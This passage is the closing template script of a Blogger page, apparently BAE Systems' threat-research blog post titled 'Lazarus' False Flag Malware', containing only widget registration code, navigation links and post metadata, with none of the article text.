'?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'Lazarus\u2019 False Flag Malware', 'description': 'Written by Sergei Shevchenko and Adrian Nish   BACKGROUND', 'featuredImage': 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5m4b1zAFAs0v7F5S4K-vCXbP6s-XN4TsFUUDQS6vxCsHPoUyuEIZrLeC9jhGJKwhtXKPk4qPX5yNJifOsd9kTfMAK9F_pqfGdmajKF8Aff-0y3Fshp2sjWwrnF8nCI0D39-KWBz2lOpI/s640/client.PNG', 'url': 'https://baesystemsai.blogspot.com/2017/02/lazarus-false-flag-malware.html', 'type': 'item', 'isSingleItem': true, 'isMultipleItems': false, 'isError': false, 'isPage': false, 'isPost': true, 'isHomepage': false, 'isArchive': false, 'isLabelSearch': false, 'postId': 2633799336061422338}}]);
_WidgetManager._RegisterWidget('_NavbarView', new _WidgetInfo('Navbar1', 'navbar', document.getElementById('Navbar1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'header', document.getElementById('Header1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_PageListView', new _WidgetInfo('PageList1', 'navigation', document.getElementById('PageList1'), {'title': 'Pages', 'links': [{'isCurrentPage': false, 'href': 'https://baesystemsai.blogspot.com/', 'title': 'Home'}, {'isCurrentPage': false, 'href': 'http://www.baesystems.com/en/cybersecurity/products', 'title': 'Products'}, {'isCurrentPage': false, 'href': 'http://www.baesystems.com/en/cybersecurity/solutions', 'title': 'Solutions'}, {'isCurrentPage': false, 'href': 'http://www.baesystems.com/en/cybersecurity/news-and-events', 'title': 'News \x26 Events'}, {'isCurrentPage': false, 'href': 'http://www.baesystems.com/en/cybersecurity/partners', 'title': 'Partners'}, {'isCurrentPage': false, 'href': 'http://www.baesystems.com/en/cybersecurity/about-us', 'title': 'About Us'}, {'isCurrentPage': false, 'href': 'http://www.baesystems.com/en/cybersecurity/careers', 'title': 'Careers'}], 'mobile': false, 'showPlaceholder': true, 'hasCurrentPage': false}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive1', 'navigation', document.getElementById('BlogArchive1'), {'languageDirection': 'ltr', 'loadingMessage': 'Loading\x26hellip;'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogSearchView', new _WidgetInfo('BlogSearch1', 'navigation', document.getElementById('BlogSearch1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_ImageView', new _WidgetInfo('Image1', 'tagline', document.getElementById('Image1'), {'resize': false}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_TextView', new _WidgetInfo('Text1', 'ban-text', document.getElementById('Text1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML3', 'grid2', document.getElementById('HTML3'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_LabelView', new _WidgetInfo('Label1', 'grid3', document.getElementById('Label1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/2172000626-lbx__en_gb.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/1964470060-lightbox_bundle.css'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML2', 'sidebar', document.getElementById('HTML2'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_PopularPostsView', new _WidgetInfo('PopularPosts1', 'sidebar', document.getElementById('PopularPosts1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML1', 'sidebar', document.getElementById('HTML1'), {}, 'displayModeFull'));
</script>
</body>
</html>